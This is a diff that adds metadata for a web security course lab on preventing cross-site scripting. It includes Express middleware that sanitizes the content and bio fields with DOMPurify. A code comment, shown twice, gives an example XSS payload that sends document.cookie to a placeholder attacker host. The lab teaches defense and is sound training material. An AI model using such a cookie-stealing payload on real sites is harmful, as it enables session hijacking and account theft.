@@ -1,0 +1,31 @@
+export const meta = {
+  id: "M18-13",
+  number: "13",
+  title: "XSS",
+  khmerTitle: "ការទប់ស្កាត់ការវាយប្រហារ Cross-Site Scripting (XSS)",
+  type: "lab",
+  codeLanguage: "javascript",
+  summary: "Cross-Site Scripting (XSS) occurs when untrusted user HTML or JavaScript input is reflected into web pages without proper encoding or sanitization. While modern frontend frameworks like React automatically escape JSX expressions, backend APIs should sanitize text fields using tools like `xss-clean` or `isomorphic-dompurify` to prevent stored malicious scripts.",
+  tip: "Sanitize user-generated rich text fields (like blog content or comments) on the server before saving to MongoDB using DOMPurify.",
+  objective: "Understand XSS mechanics and apply server-side HTML entity sanitization.",
+  expectedOutcome: "Clean database records free from executable script injections.",
+  codeSnippet: "import DOMPurify from \"isomorphic-dompurify\";\n\nexport const sanitizeContent = (req, res, next) => {\n  if (req.body.content) {\n    // Strips <script>, javascript: links, and malicious attributes like onerror=...\n    req.body.content = DOMPurify.sanitize(req.body.content);\n  }\n  if (req.body.bio) {\n    req.body.bio = DOMPurify.sanitize(req.body.bio);\n  }\n  next();\n};\n\n// Attack: \"<script>fetch('http://attacker.com?c='+document.cookie)</script>Hello\"\n// Output: \"Hello\"",
+};
+
+```javascript
+import DOMPurify from "isomorphic-dompurify";
+
+export const sanitizeContent = (req, res, next) => {
+  if (req.body.content) {
+    // Strips <script>, javascript: links, and malicious attributes like onerror=...
+    req.body.content = DOMPurify.sanitize(req.body.content);
+  }
+  if (req.body.bio) {
+    req.body.bio = DOMPurify.sanitize(req.body.bio);
+  }
+  next();
+};
+
+// Attack: "<script>fetch('http://attacker.com?c='+document.cookie)</script>Hello"
+// Output: "Hello"
+```
